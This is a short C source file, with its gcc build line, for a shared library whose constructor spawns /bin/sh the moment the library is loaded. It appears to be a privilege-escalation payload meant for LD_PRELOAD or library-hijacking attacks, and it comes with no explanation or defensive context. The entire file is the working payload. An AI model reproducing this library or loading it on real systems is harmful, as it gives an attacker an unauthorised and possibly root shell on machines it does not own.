// gcc libsh.c -shared -o libsh.so
#include <unistd.h>

__attribute__((constructor))
void init(void){
	execve("/bin/sh", NULL, NULL);
}
